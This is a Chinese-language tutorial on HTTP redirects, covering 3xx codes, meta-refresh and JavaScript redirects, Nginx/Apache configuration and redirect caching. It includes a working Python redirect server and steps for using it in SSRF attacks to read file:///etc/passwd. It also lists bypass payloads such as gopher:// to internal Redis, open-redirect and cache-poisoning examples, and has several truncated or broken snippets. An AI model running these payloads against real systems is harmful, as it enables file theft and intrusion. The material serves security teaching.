# 基础知识

## 1. 概念

**重定向（Redirect）**，简单来说，就是：

```
你本来请求的是地址 A，服务器告诉你：“这个资源现在不在这里，你去地址 B 再请求一次。”

```

所以，重定向不是“服务器把 B 的内容直接塞给你”，而是：

1. 你先请求 A
2. A 的服务器回复你一个“跳转通知”
3. 你再去请求 B
4. 最终你拿到 B 的内容

可以理解成“指路”

```
比如去 3 号窗口办业务，工作人员告诉你：

这个业务不在 3 号窗口办了，你去 7 号窗口。

你并不是在 3 号窗口把业务办完了，而是 3 号窗口告诉你去 7 号窗口

```

## 2. 原由

重定向在正常 Web 开发里非常常见，并不是什么“漏洞专用机制”，而是网站的正常功能之一

常见场景有：

- **页面地址变了**

比如原来网页是：

```url
http://example.com/old-page

```

这时候访问旧地址的人不能直接报错，于是服务器就会告诉用户

```
这个页面搬家了，请去新地址

```

- **域名统一**

比如下面这几个地址其实都想指向同一个站

```url
http://example.com
http://www.example.com
https://example.com
https://www.example.com

```

网站通常会统一到其中一个，例如

```url
https://www.example.com

```

于是访问别的版本时，服务器就会返回重定向，让用户跳到统一地址

- **登陆后跳转**

访问需要登陆的场景

```url
http://example.com/user/profile

```

但是如果没有登陆，服务器就可能会直接跳转到登录页

```url
http://example.com/login

```

登陆成功之后再自动跳转回原来的页面

- **HTTP自动跳HTTPS**

很多网站现在只允许安全连接

如果访问

```url
http://example.com

```

服务器可能会自动跳到

```url
https://example.com

```

- **短链接服务**

比如一个短链接

```url
http://short.com/abc

```

它本身不是真正内容页，而是收到请求后告诉你跳到真正地址：

```url
https://very-long-target.com/article/123456

```

## 3. 本质

>**服务器没有直接返回要访问的资源，而是返回了“去另一个地址请求”的指令**

该返回的指令

- **状态码**

- **Location响应头**

```http
HTTP/1.1 302 Found
Location: https://example.com/new-page

```

解释

```
302 : 是重定向
Location : 告诉客户端下一步去哪里

```

所以说重定向是**由服务器来决定的，告诉客户端去哪里**

## 4. 变化

重定向也不是 “ 地址栏自己变了 ” ——这只是看到的变化现象

真正的变化：

```
(1)客户端收到了服务器发来的 30x 响应
(2)客户端又自动发起了一个新的请求

```

就是说重定向的变化不是跳，而是**重新请求**

- **例子**

访问

```url
http://a.com/test

```

服务器返回

```url
HTTP/1.1 302 Found
Location: http://b.com/hello

```

不是 a.com 直接跳转到 b.com/hello ，也不是 a.com 吧 b.com/hello 的内容返回

而是 <u>客户端再次去请求 `http://b.com/hellp`</u>

```

# 所以整个过程如下
请求 A -> 收到重定向响应 -> 再请求 B

```

# 2. 常见重定向类型

重定向最常见的一类，就是 **HTTP 30x 重定向**。  

这里的 “30x”，指的是状态码以 `3` 开头，表示：

```
这个请求对应的资源位置有变化，客户端需要进一步操作

```

最常见的重定向状态码有：

- `301`─────────┐
- `302`──┐                 │
- `303`      │                 │
- `307`──┘                 │
- `308`─────────┘

它们看起来都像“跳转”，但含义和行为并不完全一样

```
301 = 永久搬家
302 = 临时借住
303 = 结果去别处看
307 = 临时搬，但请求方式别变
308 = 永久搬，但请求方式别变

```

## 301

`301 Moved Permanently`，表示：

> 这个资源已经被**永久**移动到了新地址

比如原来的页面是：

```url
http://example.com/old

```

现在永久换成了

```url
http://example.com/new

```

那访问旧网址的时候服务器旧可以返回

```http
HTTP/1.1 301 Moved Permanently
Location: http://example.com/new

```

## 302

`302 Found`，传统上通常理解为：

> 这个资源现在**临时**在另一个地方，你先去那里

例如：

```http
HTTP/1.1 302 Found
Location: http://example.com/temp

```

- **核心特点**

```
- 表示临时跳转
- 只是暂时去新地址
- 理论上还可以回到原地址
- 默认保留原请求方法***

```

- **常见使用场景**

```
- 未登陆时跳转到登陆页面，登陆成功后跳转回来
- 某个操作完成后临时跳转到某个页面，查看完后跳转回去
- 短链接服务
- 一些权限控制下的页面跳转

```

## 303

`303 See Other`，表示：

> 你这次请求处理完了，处理结果别在当前地址看，去另一个地址看

例如：

提交了一个表单

```
POST /submit

```

服务器接收处理之后返回

```http
HTTP/1.1 303 See Other
Location: /result

```

这时客户端通常会再用 **GET** 去请求

```
GET /result

```

- **特点**

```
- 明确告诉客户端：去另一个地址看结果
- 强制将请求方法改为 GET    （无论原请求是 POST/PUT/DELETE，重定向后都发 GET）***
- 常用于“提交后跳转”

```

- **常见使用场景**

```
- 避免用户刷新页面时重复提交表单
- 表单提交之后跳转到结果页  (提交订单后跳到订单详情页 | 提交评论后跳到评论结果页)
- POST 请求完成后跳到 GET 页面
- 「登录页→登录成功→跳正式页」

```

## 307

`307 Temporary Redirect`，表示：

> 临时跳转，但**请求方法**和**请求体**要尽量保持不变

它也是“临时重定向”，但和 302 相比，它更强调：

> 不要随便改请求方法

例如：

最初发送的请求是

```
POST /api/send

```

收到 307 后，客户端继续跳转时，通常还是按原来的方式去请求新地址，也就是仍然保持 POST

- **特点**

```
- 临时跳转
- 更严格地保留原请求方法
- 比 302 语义更明确

```

- **场景使用场景**

```
- 需要临时迁移接口地址，但又不希望请求方法被改掉
- 某些 API 网关、反向代理场景

```

## 308

`308 Permanent Redirect`，表示：

> 永久跳转，并且请求方法要尽量保持不变

- **特点**

```
- 永久跳转
- 语义更明确
- 更强调保留原请求方法

```

- **常见使用场景**

```
- API 地址永久迁移
- 接口升级
- 某些严格区分请求方法的服务

```

## 特殊重定向码

除了常见的 301/302/303/307/308，HTTP 协议中还有几个不常用但需要了解的 3xx 状态码。 有的已经废弃，有的有特殊含义，容易被误解

### 300

`300 Multiple Choices`，表示：

> 服务器提供了多个可选的资源地址，让客户端自己选择

- **含义**

当**一个请求**对应的**资源有多个版本或多个可选地址**时，服务器可以返回 300，并在响应体中列出所有可选项

- **响应示例**

```http
HTTP/1.1 300 Multiple Choices
Content-Type: text/html

<html>
<body>
  <h1>请选择你要访问的版本：</h1>
  <ul>
    <li><a href="/document.html">HTML 版本</a></li>
    <li><a href="/document.pdf">PDF 版本</a></li>
    <li><a href="/document.txt">纯文本版本</a></li>
  </ul>
</body>
</html>

```

- **特点**

```
- 不是真正的"自动跳转"
- 需要用户或客户端手动选择
- 响应体通常包含可选链接列表
- 实际使用场景极少

```

- **几乎不用**

因为现代 Web 开发中，这种"让用户选择"的场景通常通过以下方式实现

```
内容协商（Content Negotiation） ：服务器根据 Accept 请求头自动返回合适的格式
前端页面：直接在页面上提供下载链接，而不是用 HTTP 状态码

```

所以300在日常中基本见不到

### 304

`304 Not Modified`，表示：

> 资源未修改，客户端可以使用缓存版本

> [!CAUTION]
>
> **304 不是真正的重定向！**

虽然它的状态码是 3xx 开头，但它**不包含 Location 头**，也**不会让客户端跳转到其他地址**

- **作用**

```
告诉客户端："你上次缓存的资源还是最新的，不用重新下载了"

```

- **原理**

浏览器缓存验证流程

```
1. 浏览器第一次请求资源
   GET /image.png
   
2. 服务器返回资源 + 缓存标识
   HTTP/1.1 200 OK
   Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT
   ETag: "abc123"
   
3. 浏览器再次请求时，带上缓存标识
   GET /image.png
   If-Modified-Since: Mon, 01 Jan 2024 00:00:00 GMT
   If-None-Match: "abc123"
   
4. 服务器检查资源是否修改
   - 如果服务器文件未修改 → 浏览器访问返回 304
   - 如果服务器文件已修改 → 浏览器访问返回 200 + 新内容

```

- **304响应示例**

```http
HTTP/1.1 304 Not Modified
Date: Tue, 02 Jan 2024 10:00:00 GMT
ETag: "abc123"
Cache-Control: max-age=3600

```

- **特点**

```
- 不是重定向，是缓存验证机制
- 节省带宽（不重复传输未修改的资源）
- 常见于静态资源（图片、CSS、JS）
- 必须配合 If-Modified-Since 或 If-None-Match 使用

- 没有响应体（因为客户端直接用缓存）
- 没有 Location 头（不是跳转）
- 只有缓存相关的头部信息

```

- **常见使用场景**

```
- 浏览器加载静态资源（图片、CSS、JS）
- CDN 缓存验证
- API 响应缓存（配合 ETag）

```

- **与重定向的区别**

| 对比项      | 304 Not Modified | 302 Found（重定向）    |
| ----------- | ---------------- | ---------------------- |
| 是否跳转    | ❌ 不跳转         | ✅ 跳转到新地址         |
| Location 头 | ❌ 没有           | ✅ 必须有               |
| 响应体      | ❌ 没有           | 可能有                 |
| 作用        | 告诉客户端用缓存 | 告诉客户端去新地址请求 |
| 地址栏变化  | ❌ 不变           | ✅ 变化                 |

### 305(已废弃)

`305 Use Proxy`，表示：

> 必须通过代理访问资源

- **含义**

服务器告诉客户端："你不能直接访问这个资源，必须通过指定的代理服务器访问。"

- **响应示例(理论上)**

```http
HTTP/1.1 305 Use Proxy
Location: http://proxy.example.com:8080

```

- **废弃原因**

```

# 存在严重的安全风险
- 中间人攻击风险：恶意服务器可以强制客户端使用攻击者控制的代理
- 隐私泄露：所有流量都会经过指定的代理服务器
- 滥用风险：可能被用于流量劫持

```

- 现状

```
- HTTP/1.1 规范中已标记为废弃
    - HTTP1.1是所有HTTP版本的基础，不会废除，但是对于305这个响应，HTTP1.1是被标记未不推荐使用的
- 现代浏览器不再支持
- 实际开发中永远不应该使用

```

### 306(已废弃)

`306 Switch Proxy`，表示：

> 后续请求应该使用指定的代理

- **现状**

```
- 从未被正式使用过
- 只在早期 HTTP 规范草案中出现
- 现在已经完全废弃
- 仅作为历史遗留存在

```

- **特点**

```
- 需要切换代理
- 包含Location

```

# 3. 重定向的实现方式

统称为 “跳转” ，“重定向”，但是有多种方式

- HTTP重定向
- Meta Refresh 跳转
- JavaScript跳转

这三类看起来都像是<u>页面从A跳转到B</u>，但实际上本质，发生位置和利用方式都不一样

## HTTP重定向

> HTTP 重定向是最标准、最常见、也是最需要重点掌握的一种

例如

```http
HTTP/1.1 302 Found
Location: http://example.com/new

```

- **核心**

```
服务器返回 30x 状态码
响应头里带上 Location
客户端根据 Location 再发起新的请求

```

- **特点**

```
发生在 HTTP 协议层
是服务器明确告诉客户端去哪里
浏览器、爬虫、后端 HTTP 客户端都可能跟随
SSRF 里最常利用的就是这种

```

- **完整交互过程**

```
客户端                          服务器

   |                               |
   |  GET /old  ───────────────>   |
   |                               |
   |  <─────────  302 Found        |
   |             Location: /new    |
   |                               |
   |  GET /new  ───────────────>   |
   |                               |
   |  <─────────  200 OK           |
   |             [页面内容]         |

```

- **谁会跟随HTTP重定向**

```
浏览器            → 默认自动跟随（用户无感知）
curl             → 默认不跟随，加 -L 才跟随
Python requests  → 默认自动跟随（allow_redirects=True）
后端 HTTP 客户端   → 取决于配置（SSRF 的关键点）

```

- **安全角度**

```
- 是 SSRF 最常利用的跳转方式
- 可以跨协议跳转（http → file://）
- 后端如果不限制跟随次数，可以构造重定向链

```

## Meta Refresh 跳转

> Meta Refresh 是写在 **HTML 页面里**的跳转方式，由浏览器解析 HTML 后执行

- **基础语法**

```html
<meta http-equiv="refresh" content="秒数; url=目标地址">

```

**让网页等待 N 秒后，自动跳转到另一个网址**

```

# 讲解
<meta> - 原数据标签
http-equiv - 模拟HTTP响应头
content="" - 放两个参数

```

- **示例**

```html
<!-- 立刻跳转（0秒） -->
<meta http-equiv="refresh" content="0; url=http://example.com/new">

<!-- 3秒后跳转 -->
<meta http-equiv="refresh" content="3; url=http://example.com/new">

<!-- 只刷新当前页面，不跳转 -->
<meta http-equiv="refresh" content="5">

```

- **核心**

```
写在 HTML 的 <head> 标签里
浏览器渲染 HTML 时读取这个标签
等待指定秒数后，浏览器自动跳转到指定地址

```

- **特点**

```
发生在 HTML 层，不是 HTTP 协议层
只有浏览器能解析，爬虫和后端 HTTP 客户端大多不跟随
服务器返回的是正常的 200 响应，跳转逻辑在页面里
用户如果速度够快可以手动停止跳转（比如按 Esc）

```

- **与HTTP重定向的区别**

```
HTTP 重定向：服务器在响应头里告诉你去哪里（客户端还没看到页面）
Meta Refresh：服务器先给你一个正常页面，页面里告诉你去哪里

```

- **安全角度**

```
- 后端 SSRF 一般不会受影响（因为后端通常不解析 HTML）
- 但如果目标是"让用户浏览器跳转"，Meta Refresh 同样有效
- 钓鱼页面、开放重定向场景中也会用到
- 爬虫和安全扫描器有些会解析 meta refresh，有些不会

```

- **历史背景（简单提一下）**

```
Meta Refresh 是早期 Web 的产物
在 HTTP/1.1 普及之前，很多人用它来做页面跳转
现在的正规开发中几乎不再用（改用 HTTP 重定向或 JS 跳转）
但老旧网站、邮件营销页面里仍然能见到

```

## JavaScript跳转

> JavaScript 跳转是通过 **JS 代码**控制浏览器跳转，由浏览器的 JavaScript 引擎执行

- **常见写法**

````javascript
// 方式一：直接修改 location.href（最常见）
window.location.href = "http://example.com/new";

# window.location.href : 用来获取当前网页地址，或者让页面跳转到另一个网址（会保留历史记录）

// 方式二：简写（效果相同）
location.href = "http://example.com/new";

# window.location.href的简写版 

// 方式三：replace（跳转后不留下历史记录）
window.location.replace("http://example.com/new");

# 用新页面替换当前页面，进行跳转，且不留下历史记录

// 方式四：assign（效果同 href，留下历史记录）
window.location.assign("http://example.com/new");

# 效果跟window.location.href是一样的，但是href那个是属性，assign()是方法

// 方式五：修改 location.href 的各个部分
window.location.host = "example.com";
window.location.pathname = "/new";

# 用于修改

````

- **各方式区别**

```

# 上面已经以注释的形式写了，这里再总结一下
window.location.href : 用来获取当前网页地址，或者让页面跳转到另一个网址（会保留历史记录），用户可以按返回键回来 ；是属性
location.href : 简写版
window.location.replace() : 用新页面替换当前页面，进行跳转，且不留下历史记录
window.location.assign() : 效果跟window.location.href一样 ；是方法
window.location.host/pathname : 用于修改

```

- **核心**

```
跳转逻辑写在 JS 里
浏览器执行 JS 后触发跳转
可以根据条件动态决定跳转地址

```

- **特点**

```
发生在客户端（浏览器），不是服务器层
只有能执行 JS 的环境才能触发（浏览器、部分爬虫）
后端 HTTP 客户端（如 requests）完全不会执行 JS
可以结合用户行为、时间、条件判断来跳转

```

- **常见使用场景**

```
- 登录成功后跳转（配合 Token 校验）
- 倒计时结束后跳转
- 根据用户设备类型跳转（PC / 移动端）
- 前端框架的路由跳转（Vue Router / React Router）

```

- **安全角度**

```
- 常见于 Open Redirect 漏洞
- 如果跳转地址来自用户输入且未过滤，可能跳转到任意地址
- 可配合 XSS 利用（javascript: 伪协议）

```

- **例子**

```javascript
// 危险写法：跳转地址直接来自用户输入
var url = new URLSearchParams(location.search).get('redirect');
window.location.href = url;  // 如果 url 是 javascript:alert(1) 就触发 XSS

```

## 三种跳转区别

| 对比项             | HTTP 重定向           | Meta Refresh      | JavaScript 跳转   |
| ------------------ | --------------------- | ----------------- | ----------------- |
| 发生位置           | 服务器（HTTP 协议层） | 浏览器（HTML 层） | 浏览器（JS 引擎） |
| 触发时机           | 收到响应头时          | 渲染 HTML 后      | 执行 JS 后        |
| 服务器状态码       | 30x                   | 200（正常页面）   | 200（正常页面）   |
| 浏览器是否跟随     | 自动跟随              | 自动跟随          | 自动跟随          |
| 后端 HTTP 客户端   | 可能跟随              | 通常不跟随        | 不跟随            |
| 爬虫是否跟随       | 多数跟随              | 部分跟随          | 多数不跟随        |
| 是否可控延迟       | 不能                  | 可以设置秒数      | 可以 setTimeout   |
| SSRF 利用价值      | 最高                  | 极低              | 极低              |
| Open Redirect 风险 | 有                    | 有                | 有（且更灵活）    |

- **总结**

```
HTTP 重定向    → 服务器层，最底层，影响最广
Meta Refresh  → HTML 层，浏览器专属，几乎淘汰
JS 跳转        → 客户端层，最灵活，只有浏览器能触发

```

# 4.实战操作：搭建重定向服务器

## 场景说明

- **典型场景**

```
目标存在 SSRF 漏洞
        ↓
直接让目标请求 file:///etc/passwd → 被过滤拦截
        ↓
换个思路：让目标请求你的服务器
        ↓
你的服务器返回 302 → Location: file:///etc/passwd
        ↓
目标跟随重定向 → 读取本地文件

```

- **核心思路**

```
控制一台服务器
这台服务器收到请求后，返回重定向响应
把目标引导到你真正想让它访问的地址

```

所以需要的是

```
一台可以对外访问的服务器（VPS / 本地 + 内网穿透 / 在线工具）
能运行一段代码，让它返回 302 + Location 头

```

- **完整流程图**

```
攻击者                   你的VPS                  目标服务器

   |                        |                        |
   | 启动重定向服务器 ──>      |                        |
   |                        |                        |
   | 发送 SSRF Payload ───────────────────────>       |
   |                        |                        |
   |                        | <── GET / ───────────  |
   |                        |                        |
   |                        | 302 file:///etc/passwd |
   |                        | ──────────────────>    |
   |                        |                        |
   |                        |             读取本地文件 |
   |                        |                        |
   | <──────────────────────────── 返回文件内容 ───    |
   |                        |                        |

```

## 01 Python快速搭建

Python 是最方便的，不需要额外配置环境，写几行代码直接跑

- **http.server**（无需安装任何依赖）

```python

# redirect_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        # 返回 302 重定向
        self.send_response(302)
        self.send_header('Location', 'file:///etc/passwd')
        self.end_headers()
    
    # 屏蔽日志输出（可选，让终端干净一点）
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), RedirectHandler)
    print("[*] Redirect server running on port 8080")
    server.serve_forever()

```

这是开启8080端口，做题的话将自己服务器的公网IP:8080传上去。

运行

```bash
python3 redirect_server.py
```

## 实战案例

> 重定向到file:///etc/passwd完整流程

- **场景**

```
目标网站存在 SSRF 漏洞
参数：http://target.com/fetch?url=xxx
目标会请求 url 参数指定的地址，并返回内容

限制：目标做了简单过滤，直接填 file:// 会被拦截

```

- **攻击思路**

```
直接请求 file:///etc/passwd → 被过滤
        ↓
换成：让目标请求我们的服务器
我们的服务器返回 302 → Location: file:///etc/passwd
目标跟随重定向，绕过过滤，读取文件

```

- **攻击步骤**

**1. 搭建重定向服务器**

```python

    def do_GET(self):

        self.send_header('Location', 'file:///etc/passwd')
        self.end_headers()
    def log_message(self, format, *args):
        print(f"[*] 收到请求: {self.requestline}")

HTTPServer(('0.0.0.0', 8888), RedirectHandler).serve_forever()

```

```bash
python3 redirect.py

# [*] Redirect server running...

```

**2. 验证重定向服务器正常工作**

```bash
curl -i http://1.2.3.4:8888/

# 期望输出：

# HTTP/1.0 302 Found

# Location: file:///etc/passwd

```

**3. 构造SSRF Payload**

```
http://target.com/fetch?url=http://1.2.3.4:8888/

```

**4. 发送请求**

用Burp Suite 或 curl 发送

```bash
curl "http://target.com/fetch?url=http://1.2.3.4:8888/"

```

**5. 观察结果**

```
如果目标跟随了重定向：
  → 返回 /etc/passwd 的内容（root:x:0:0:root:/root:/bin/bash...）
  → 漏洞利用成功！
```

## 常见问题

- **1. 目标没有跟随重定向**

排查方向

```

   - curl 默认不跟随，需要 -L

2. 目标是否限制了重定向次数？

3. 是否有 WAF 拦截了重定向响应？

```

解决方案

```

# 测试目标是否跟随重定向

# 先用 http -> http 的重定向测试（最简单的情况）

# 如果这个都不跟随，说明目标程序本身不跟随重定向

```

- **2. file://协议被拒绝**

目标跟随了重定向，但是不支持`file://`协议

可尝试的替代

```
file:///etc/passwd          → 读取密码文件

file:///proc/self/environ   → 读取环境变量
file:///proc/net/tcp        → 读取网络连接信息

gopher://127.0.0.1:6379/_   → 攻击内网服务

```

尝试编码绕过

```
file:///etc/passwd
File:///etc/passwd          → 大小写变换
file%3a///etc/passwd        → URL 编码冒号
file:///etc%2fpasswd        → URL 编码斜杠

```

# 5. 服务器配置

[参考文章](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Redirections)

## Nginx重定向配置详解

### return指令

最简单直接的重定向方式

```nginx
server {
    listen 80;
    server_name old.example.com;
    
    # 所有请求都重定向到新域名
    return 301 https://new.example.com$request_uri;
}

```

**语法结构**

```
return [状态码] [URL];

```

**常见用法**

```nginx

# 301 永久重定向
return 301 https://example.com;

# 302 临时重定向
return 302 https://example.com;

# 保留原始请求路径
return 301 https://example.com$request_uri;

# 保留查询参数
return 301 https://example.com$request_uri$is_args$args;

```

### rewrite指令

`rewrite` 可以做正则匹配和路径改写

```nginx
server {
    listen 80;
    server_name example.com;
    
    # 把 /old/xxx 重定向到 /new/xxx
    rewrite ^/old/(.*)$ /new/$1 permanent;
    
    # 把所有 .php 结尾的请求重定向到首页
    rewrite ^/.*\.php$ / redirect;
}

```

**语法结构**

```
rewrite [正则表达式] [替换目标] [flag];

```

**flag参数**

```
last       → 停止处理当前 rewrite 规则，重新匹配新 URI
break      → 停止处理 rewrite 规则，不再重新匹配
redirect   → 返回 302 临时重定向
permanent  → 返回 301 永久重定向

```

**实际例子**

```nginx

# HTTP 强制跳转 HTTPS
server {
    listen 80;
    server_name example.com;
    rewrite ^(.*)$ https://$host$1 permanent;
}

# 旧 URL 结构迁移到新结构

# /article/123 -> /post/123
rewrite ^/article/(\d+)$ /post/$1 permanent;

# 移动端跳转
if ($http_user_agent ~* "mobile|android|iphone") {
    rewrite ^(.*)$ https://m.example.com$1 redirect;
}

```

### location块内的重定向

```nginx
server {
    listen 80;
    server_name example.com;
    
    # 访问 /admin 时重定向
    location = /admin {
        return 301 https://admin.example.com;
    }
    
    # 访问 /old 开头的路径时重定向
    location ^~ /old/ {
        rewrite ^/old/(.*)$ /new/$1 permanent;
    }
    
    # 正则匹配：所有图片请求重定向到 CDN
    location ~* \.(jpg|png|gif)$ {
        return 301 https://cdn.example.com$request_uri;
    }
}

```

### 安全风险：**Nginx 配置不当导致的Open Redireact**

危险配置示例

```nginx

# 危险！直接从请求参数读取跳转目标
location /redirect {
    return 302 $arg_url;
}

```

攻击者可以构造

```
https://example.com/redirect?url=https://evil.com

```

目标用户会被重定向到攻击者的网站（钓鱼）

安全的写法

```nginx

# 方案 1：白名单限制
location /redirect {
    if ($arg_url ~* "^https://example\.com") {
        return 302 $arg_url;
    }
    return 403;
}

# 方案 2：不从参数读取，写死目标
location /redirect {
    return 302 https://example.com/target;
}

```

## Apache 重定向

Apache 主要通过 `mod_rewrite` 模块实现重定向

### .htaccess文件配置

`.htaccess` 是 Apache 的目录级配置文件，可以放在网站根目录或子目录

**基础语法**

```apache

# 开启重写引擎
RewriteEngine On

# 重定向规则
RewriteRule [匹配模式] [目标地址] [标志]

```

### 常见配置模板

- **HTTP 强制跳 HTTPS**

```apache
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

```

解释

```
RewriteCond %{HTTPS} off  → 条件：如果当前不是 HTTPS
RewriteRule ^(.*)$        → 匹配所有路径
https://%{HTTP_HOST}%{REQUEST_URI}  → 跳转到 HTTPS 版本
[R=301,L]                 → 301 重定向，停止后续规则

```

- **www 和 非www 统一**

```apache

# 把 www.example.com 重定向到 example.com
RewriteEngine On
RewriteCond %{HTTP_HOST} ^www\.example\.com$ [NC]
RewriteRule ^(.*)$ https://example.com/$1 [R=301,L]

```

- **旧 URL结构迁移**

```apache

# /old/page.html -> /new/page.html
RewriteEngine On
RewriteRule ^old/(.*)$ /new/$1 [R=301,L]

```

- **特定文件类型重定向到CDN**

```apache
RewriteEngine On
RewriteCond %{REQUEST_URI} \.(jpg|png|gif|css|js)$ [NC]
RewriteRule ^(.*)$ https://cdn.example.com/$1 [R=301,L]

```

### Apache 主配置文件

> httpd.conf / apache2.conf

```apache
<VirtualHost *:80>
    ServerName old.example.com
    Redirect 301 / https://new.example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName new.example.com
    
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    
    DocumentRoot /var/www/html
</VirtualHost>

```

### Redirect指令

```apache

# 语法
Redirect [状态码] [原路径] [目标地址]

# 示例
Redirect 301 /old https://example.com/new
Redirect 302 /temp https://example.com/temp-page
Redirect permanent /old-blog https://blog.example.com

```

### 安全风险:Apache配置不当

- **危险配置**

```apache

# 危险！直接从 QUERY_STRING 读取跳转目标
RewriteEngine On
RewriteCond %{QUERY_STRING} url=(.*)
RewriteRule ^redirect$ %1 [R=302,L]

```

攻击者可以构造

```
https://example.com/redirect?url=https://evil.com

```

- **安全写法**

```apache

# 白名单限制
RewriteEngine On
RewriteCond %{QUERY_STRING} url=(https://example\.com/.*)
RewriteRule ^redirect$ %1 [R=302,L]

```

## 实战案例

> 利用配置不当的重定向

- **（一）Open Redirect绕过白名单**

目标配置

```nginx
location /redirect {
    if ($arg_url ~* "^https://example\.com") {
        return 302 $arg_url;
    }
    return 403;
}

```

看起来做了白名单限制，但可以绕过

```

```

因为正则 `^https://example\.com` 只匹配开头，`example.com.evil.com` 也能通过

正确写法

```nginx
if ($arg_url ~* "^https://example\.com/") {
    return 302 $arg_url;
}

```

- **SSRF配合重定向读取内网**

目标存在 SSRF，但过滤了 `file://` 和 `127.0.0.1`

攻击者搭建重定向服务器

```nginx
server {
    listen 80;
    server_name attacker.com;

        return 302 file:///etc/passwd;
    }
}

```

然后让目标请求

```

```

目标跟随重定向，绕过过滤读取本地文件

# 6. 重定向与缓存

## 二者关系

很多人以为"重定向"和"缓存"是两个独立的话题，但实际上它们在 Web 安全和性能优化中经常交织在一起

```
- 301 重定向会被浏览器缓存，可能导致安全问题
- 304 状态码虽然不是重定向，但经常和 30x 混淆
- 缓存策略不当会导致重定向失效或被绕过
- 渗透测试中需要清除缓存才能复现某些漏洞

```

## 304 Not Modified

这个在最开始已经讲过了，这里再说一下（前两点），再加上扩展新的（后面的）

- **含义跟流程**

```

# 含义
304 Not Modified = "你要的资源没变，用你本地缓存的版本就行"

# 完整流程
1. 浏览器第一次请求 /style.css
2. 服务器返回 200 + 文件内容 + ETag: "abc123"
3. 浏览器把文件缓存下来

4. 浏览器第二次请求 /style.css
5. 浏览器带上 If-None-Match: "abc123"
6. 服务器检查：文件的 ETag 还是 "abc123"，没变
7. 服务器返回 304（不返回文件内容）
8. 浏览器直接用本地缓存的文件

```

- **304与重定向的对比**

| 对比项       | 304 Not Modified     | 302 Found（重定向）        |
| ------------ | -------------------- | -------------------------- |
| 本质         | 缓存验证             | 资源位置变更               |
| 是否改变 URL | 不变                 | 变                         |
| 是否返回内容 | 不返回（用缓存）     | 不返回（让你去新地址请求） |
| 响应头       | ETag / Last-Modified | Location                   |
| 后续行为     | 读取本地缓存         | 发起新请求到新地址         |

- **304触发**

服务器需要配置缓存验证头

**1. Etag(实体标签)**

```http

# 第一次请求
GET /style.css HTTP/1.1

# 服务器响应
HTTP/1.1 200 OK
ETag: "abc123"
Content-Type: text/css

body { color: red; }

```

```http

# 第二次请求（浏览器自动带上）
GET /style.css HTTP/1.1
If-None-Match: "abc123"

# 服务器响应
HTTP/1.1 304 Not Modified
ETag: "abc123"

```

**2. Last-Modified(最后修改时间)**

```http

# 第一次请求
GET /style.css HTTP/1.1

# 服务器响应
HTTP/1.1 200 OK
Last-Modified: Wed, 15 Apr 2026 12:00:00 GMT
Content-Type: text/css

body { color: red; }

```

```http

# 第二次请求
GET /style.css HTTP/1.1
If-Modified-Since: Wed, 15 Apr 2026 12:00:00 GMT

# 服务器响应
HTTP/1.1 304 Not Modified
Last-Modified: Wed, 15 Apr 2026 12:00:00 GMT

```

## 浏览器如何缓存重定向

### 301永久缓存

>**浏览器会缓存 301 重定向，下次直接跳转，不再请求原地址**

```
第一次访问 http://old.com/page
服务器返回：
  HTTP/1.1 301 Moved Permanently
  Location: http://new.com/page

浏览器记住了这个重定向

第二次访问 http://old.com/page
浏览器直接跳转到 http://new.com/page
不再向 old.com 发请求！

```

### 302非永久缓存(有例外)

- **理论**

```
302 是临时重定向，浏览器不应该缓存
每次都应该先请求原地址，再跟随重定向

```

- **实际**

```
- Chrome/Firefox 在某些情况下也会短暂缓存 302
- 如果响应头带了 Cache-Control，302 也可能被缓存

```

### 控制重定向是否被缓存

- **让重定向被缓存**

```http
HTTP/1.1 301 Moved Permanently
Location: https://new.com/page
Cache-Control: max-age=31536000

```

- **禁止重定向被缓存(确保每次都重新判断)**

```http
HTTP/1.1 302 Found
Location: https://new.com/page
Cache-Control: no-cache, no-store, must-revalidate

```

## 缓存导致的安全问题

- **301缓存导致漏洞修复失败**

场景

```
1. 网站存在 Open Redirect 漏洞：
   http://example.com/redirect?url=https://evil.com

2. 攻击者访问后，浏览器缓存了这个 301 重定向

3. 开发者修复了漏洞，改成了白名单验证

4. 但攻击者的浏览器还是会直接跳转到 evil.com
   因为浏览器缓存了旧的 301 重定向

```

解决方案

```
- 修复漏洞时，同时清理 CDN 缓存
- 通知用户清除浏览器缓存
- 或者改用 302 而不是 301

```

- **缓存投毒**

攻击流程

```
1. 攻击者构造特殊请求，让服务器返回恶意重定向
2. 这个响应被 CDN 或代理服务器缓存
3. 其他用户访问时，直接拿到被污染的缓存
4. 所有用户都被重定向到攻击者的网站

```

示例

```http

# 攻击者发送
GET /page HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com

# 服务器错误地使用了 X-Forwarded-Host
HTTP/1.1 301 Moved Permanently
Location: https://evil.com/page
Cache-Control: public, max-age=3600

# 这个响应被 CDN 缓存

# 接下来 1 小时内，所有访问 /page 的用户都会被重定向到 evil.com

```

- **HSTS缓存绕过**

HSTS(HTTP Strict Transport Security)

```
强制浏览器只用 HTTPS 访问网站
即使用户输入 http://，浏览器也会自动改成 https://

```

绕过方式

```
1. 攻击者在用户第一次访问前，进行中间人攻击
2. 拦截 HSTS 响应头，不让浏览器缓存
3. 用户后续访问时，浏览器不知道要用 HTTPS
4. 攻击者可以继续中间人攻击

```

## Nginx/Apache缓存配置

### Nginx配置示例

- **禁用重定向缓存**

```nginx
location /redirect {
    return 302 https://example.com/new;
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Pragma "no-cache";
    add_header Expires "0";
}

```

- **启用304缓存机制**

```nginx
location ~* \.(css|js|jpg|png)$ {
    etag on;
    expires 1y;
    add_header Cache-Control "public, immutable";
}

```

### Apache配置示例

- **禁用重定向缓存**

```apache
<Location /redirect>
    Redirect 302 /new
    Header set Cache-Control "no-cache, no-store, must-revalidate"
    Header set Pragma "no-cache"
    Header set Expires "0"
</Location>

```

- **启用304缓存验证**

```apache
<FilesMatch "\.(css|js|jpg|png)$">
    FileETag MTime Size
